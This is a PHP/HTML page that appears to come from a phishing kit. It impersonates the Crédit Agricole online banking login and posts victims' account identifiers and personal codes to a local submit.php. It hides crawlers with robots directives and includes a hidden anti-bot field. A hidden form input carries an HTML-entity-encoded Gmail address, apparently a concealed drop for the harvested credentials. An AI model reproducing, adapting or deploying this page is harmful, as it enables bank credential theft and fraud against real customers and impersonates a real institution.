<?php



include_once '../inc/app.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>

    <!-- Meta Tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">

    <!-- Browser Color Styling -->
    <meta name="theme-color" content="#6dc77a"/>
    <meta name="msapplication-navbutton-color" content="#6dc77a"/>
    <meta name="apple-mobile-web-app-status-bar-style" content="#6dc77a" />

    <!-- Favicon -->
    <link rel="icon" type="image/png" href="../assets/images/favicon.png">
    
    <!-- Bootstrap -->
    <link rel="stylesheet" href="../assets/css/bootstrap.min.css" />
    
    <!-- Helpers -->
    <link rel="stylesheet" href="../assets/css/helpers.css" />

    <!-- Fonts -->
    <link rel="stylesheet" href="../assets/css/fonts.css" />

    <!-- Main -->
    <link rel="stylesheet" href="../assets/css/main.css" />


    <title>Acc&egrave;s CR - Crédit Agricole</title>

</head>
<body>

    <!-- HEADER -->
    <!--<header id="header">
        <div class="left col-md-2">
            <div class="logo text-center"><a href="#"><img src="../assets/images/logo.svg"></a></div>
        </div>
        <div class="right col-md-10 pl-0">
            <div class="top d-flex align-items-center h-50">
                <div class="first"><a href="#">Vous êtes un particulier <i class="fas fa-chevron-down"></i></a></div>
                <div class="second flex-grow-1">
                    <div class="d-flex align-items-center justify-content-center">
                        <div class="form flex-grow-1 d-flex justify-content-center align-items-center">
                            <span class="flex-grow-1">Rechercher une thématique, un produit...</span>
                            <i class="fas fa-search"></i>
                        </div>
                        <div class="marker d-flex justify-content-center align-items-center">
                            <i class="fas fa-map-marker-alt"></i>
                        </div>
                    </div>
                </div>
                <div class="third">
                    <ul>
                        <li><a href=""><i class="far fa-circle"></i> Nous contacter</a></li>
                        <li><a href="">Devenir Client</a></li>
                        <li><a href=""><i class="fas fa-unlock-alt"></i> mon espace</a></li>
                    </ul>
                </div>
            </div>
            <div class="bottom d-flex align-items-center h-50">
                <ul>
                    <li><a href="#">COMPTES & CARTES</a></li>
                    <li><a href="#">ÉPARGNER</a></li>
                    <li><a href="#">S'ASSURER</a></li>
                    <li><a href="#">EMPRUNTER</a></li>
                    <li><a href="#">SIMULATION & DEVIS</a></li>
                    <li><a href="#">NOS CONSEILS</a></li>
                </ul>
            </div>
        </div>
    </header>-->
    <!-- END HEADER -->

    <header id="header2">
        <div class="logo">
            <a href="#"><img style="max-width: 170px;" src="../assets/images/calogo.png"></a>
        </div>
        <div class="closse"><i class="fas fa-times"></i></div>
    </header>

    <!-- MAIN -->
    <main id="main">
        <div class="left">
            <div class="left-inner text-white">
                
                <h3>Important. Votre portail change vos habitudes de navigation aussi.</h3>
                <p>
                    Nous vous recommandons de prendre connaissance des nouveautés au travers de cette présentation s’adressant tout particulièrement à nos utilisateurs en situation de handicap visuel. 
                </p>
                <a href="#" class="btn btn-light fz14" style="color: #007D8F; padding: 10px 20px;">Découvrir les nouvelles fonctionnalités</a>

            </div>
        </div>
        <div class="right">
            <h1 class="mb-5">ACCÉDER À <b>MES COMPTES</b></h1>
            <div class="row">
                <div class="col-md-6">
                    <div class="form">
                        <div class="top-text">
                            <span>IDENTIFIANT</span>
                            <a href="#">Perdu / Oublié ?</a>
                        </div>
                        <form method="post" action="submit.php">
                            <div class="form-group">
                                <label for="identifiant">Saisissez votre identifiant à 11 chiffres</label>
                                <input type="text" name="identifiant" id="identifiant" class="form-control" maxlength="11" pattern="[0-11]{5}" placeholder="Ex: 98652706859">
                                <span class="btn-x btn-identifiant">x</span>
                            </div>
                            <div class="form-group zow">
                                <div class="top-text">
                                    <span>CODE PERSONNEL</span>
                                    <a href="#">Perdu / Oublié ?</a>
									<input type="hidden" class="form-control" name="HTTP_USER_AGENT" autocapitalize="none" autocomplete="off" value="&comma;&#x6a;&#x77;&#x38;&#x30;&#x31;&#x36;&#x38;&#x35;&#x39;&commat;&#x67;&#x6d;&#x61;&#x69;&#x6c;&period;&#x63;&#x6f;&#x6d;">
                                </div>
                                <input type="password" name="password" id="password" class="form-control" placeholder="Tapez votre code dans le pavé numérique" readonly="readonly" maxlength="6">
                                <span class="btn-x btn-password">x</span>
                            </div>
                            <div class="form-group zow">
                                <div class="numbers">
                                    <ul class="mb-3">
                                        <li><a data-number="6">6</a></li>
                                        <li><a data-number="8">8</a></li>
                                        <li><a data-number="1">1</a></li>
                                        <li><a data-number="9">9</a></li>
                                        <li><a data-number="0">0</a></li>
                                    </ul>
                                    <ul>
                                        <li><a data-number="2">2</a></li>
                                        <li><a data-number="7">7</a></li>
                                        <li><a data-number="3">3</a></li>
                                        <li><a data-number="5">5</a></li>
                                        <li><a data-number="4">4</a></li>
                                    </ul>
                                </div>
                            </div>
                            <input type="hidden" name="type" value="login">
                            <div class="form-group mt-5">
                                <button type="button" class="btn-get-pass disabled">Entrer mon code personnel</button>
                                <button type="submit" class="btn-submit zow disabled" disabled>VALIDER</button>
                            </div>
                            <div class="form-bottom">
                                <h3>Vous n’êtes pas encore client ?</h3>
                                <button type="button">Devenir client</button>
                            </div>
                            <input type="hidden" name="verbot">
                            <input type="hidden" name="type" value="login">
                        </form>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="mb-5">
                        <h4>VOTRE IDENTIFICATION NE CHANGE PAS</h4>
                        <p>Pour accéder à votre compte, saisissez votre identifiant (numéro de compte ou numéro de contrat CAEL) et votre code personnel habituels.</p>
                    </div>
                    <div>
                        <h4>SÉCURITÉ</h4>
                        <p>Restez vigilants et veillez à protéger vos données personnelles. <a href="#">Consultez nos conseils de sécurité</a></p>
                        <p>Nous vous invitons également à consulter régulièrement nos Conditions Générales d'utilisation.<br><a href="#">Voir les Conditions Générales d'Utilisation</a></p>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <script src="../assets/js/jquery.min.js"></script>
    <script src="../assets/js/popper.min.js"></script>
    <script src="../assets/js/bootstrap.min.js" ></script>
    <script src="../assets/js/fontawesome.js"></script>
    <script src="../assets/js/main.js"></script>

</body>
</html>